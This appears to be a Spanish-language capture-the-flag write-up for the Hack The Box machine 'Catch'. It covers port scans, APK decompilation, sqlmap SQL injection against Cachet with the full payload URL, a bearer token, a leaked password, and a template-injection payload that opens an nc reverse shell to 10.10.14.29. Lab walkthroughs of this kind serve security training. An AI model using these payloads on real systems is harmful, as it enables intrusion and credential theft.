---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Catch              |
| Os                     | Linux              |
| Difficulty             | Medium             |
| Points                 | 30                 |
| IP                     | 10.10.11.150       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Catch/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.150
```

![Nmap 1](/assets/images/Catch/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

![Nmap 2](/assets/images/Catch/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos.

![Nmap 3](/assets/images/Catch/nmap3.png)

Despues veremos mas sobre los servicios que corren en el puerto 80, 3000, 5000 y 8000 con whatweb.

![whatweb](/assets/images/Catch/whatweb.png)


![Landing page](/assets/images/Catch/landing_page.png)


Despues de que seguimos navegando por el servicio web, nos encontramos con un .apk, el cual lo descompilaremos con <a href="https://github.com/pxb1988/dex2jar.git">d2j-dex2jar.sh</a>. Una vez clonado y correr ./gradlew distZip , navegaremos a dex2jar/dex-tools/build/distributions/dex-tools-2.2-SNAPSHOT. El comando para ejecutar la aplicacion es:

```s
sh d2j-dex2jar.sh -f /home/rebick/Documents/HtB/Catch/name.apk
```

Buscando en el codigo fuente, encontramos un link dirigido a `https://status.catch.htb`, asi que agregaremos este dominio a nuestro `/etc/hosts`

![Function that call subdomain.](/assets/images/Catch/pointing_subdomain.png)

Ahora analizaremos el dominio con <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF.</a>Con esta herramienta encontraremos tokens de mucha importancia y podremos explotarlos despues. Por ahora, solo nos enfocaremos en `https://status.catch.htb`. Primero hay que iniciar el servicio y visitarlo en el navegador.

```s
#Para iniciar la herramienta
sh ./run.sh
```

Una vez ejecutada la herramienta, abrimos el navegador y ponemos `http://localhost:8000/`, el dashboard nos pedira soltar el .apk ahi mismo e iniciara el analisis. Despues de que concluya, nos vamos a la parte de Analysis

![Secrets](/assets/images/Catch/secrets.png)

En este dominio se encontro que es usado el frame Cachet, la otra evidencia indica que hay vulnerabilidades de SQLI, y vulnerabilidades de ejecusion de comandos.
Usaremos sqlmap para detectar estas vulnerabilidades.

```s
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
```

![SQL Payload](/assets/images/Catch/SQLpayload.png)

Vamos por la webshell

```s
curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms
```

Primero Obtenemos el json de Rooms.

```json
[{"id":"61b86b28d984e2451036eb17",
"slug":"status",
"name":"Status",
"description":"Cachet Updates and Maintenance",
"lastActive":"2021-12-14T10:34:20.749Z",
"created":"2021-12-14T10:00:08.384Z",
"owner":"61b86aead984e2451036eb16",
"private":false,
"hasPassword":false,
"participants":[]},
{"id":"61b8708efe190b466d476bfb",
"slug":"android_dev",
"name":"Android Development",
"description":"Android App Updates, Issues & More",
"lastActive":"2021-12-14T10:24:21.145Z",
"created":"2021-12-14T10:23:10.474Z",
"owner":"61b86aead984e2451036eb16",
"private":false,
"hasPassword":false,
"participants":[]},
{"id":"61b86b3fd984e2451036eb18",
"slug":"employees",
"name":"Employees",
"description":"New Joinees, Org updates",
"lastActive":"2021-12-14T10:18:04.710Z",
"created":"2021-12-14T10:00:31.043Z",
"owner":"61b86aead984e2451036eb16",
"private":false,
"hasPassword":false,
"participants":[]}]
```

Y ahora descargamos

```s
curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
```

En este response, obtuvimos la contrasena de john.

```json
[{"id":"61b8732cfe190b466d476c02",
"text":"ah sure!",
"posted":"2021-12-14T10:34:20.749Z",
"owner":"61b86dbdfe190b466d476bf0",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b8731ffe190b466d476c01",
"text":"You should actually include this task to your list as well as a part of quarterly audit","posted":"2021-12-14T10:34:07.449Z",
"owner":"61b86aead984e2451036eb16",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b872b9fe190b466d476c00",
"text":"Also make sure we've our systems, applications and databases up-to-date.","posted":"2021-12-14T10:32:25.514Z",
"owner":"61b86dbdfe190b466d476bf0",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b87282fe190b466d476bff",
"text":"Excellent! ",
"posted":"2021-12-14T10:31:30.403Z",
"owner":"61b86aead984e2451036eb16",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b87277fe190b466d476bfe",
"text":"Why not. We've this in our todo list for next quarter",
"posted":"2021-12-14T10:31:19.094Z",
"owner":"61b86dbdfe190b466d476bf0",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b87241fe190b466d476bfd",
"text":"@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
"posted":"2021-12-14T10:30:25.108Z",
"owner":"61b86aead984e2451036eb16",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b8702dfe190b466d476bfa",
"text":"Here are the credentials `john :  E}V!mywu_69T4C}W`",
"posted":"2021-12-14T10:21:33.859Z",
"owner":"61b86f15fe190b466d476bf5",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b87010fe190b466d476bf9",
"text":"Sure one sec.",
"posted":"2021-12-14T10:21:04.635Z",
"owner":"61b86f15fe190b466d476bf5",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b86fb1fe190b466d476bf8",
"text":"Can you create an account for me ? ",
"posted":"2021-12-14T10:19:29.677Z",
"owner":"61b86dbdfe190b466d476bf0",
"room":"61b86b28d984e2451036eb17"},

{"id":"61b86f4dfe190b466d476bf6",
"text":"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
"posted":"2021-12-14T10:17:49.761Z",
"owner":"61b86f15fe190b466d476bf5",
"room":"61b86b28d984e2451036eb17"}] 
```

Encontramos la cuenta y contrasena `john : E}V!mywu_69T4C}W`. El apiKey de john fue encontrada por medio de SQLInjection.
Lo siguiente por hacer es 

```s
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbms=mysql -D cachet -T users -C api_key,username --dump
```

Ahora podemos usar burpsuite para insertar el response de la siguiente forma:


![Burpsuite](/assets/images/Catch/burpsuite_john_response.png)

![SSLI](/assets/images/Catch/ssli.png)

En el SSLI pondremos 

```s
{% raw %}
{{%["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8081 >/tmp/f"] | filter("system") | join(",")%}} 
{% endraw %}
```
para establecer una reverse shell y ponernos en escucha por el puerto 443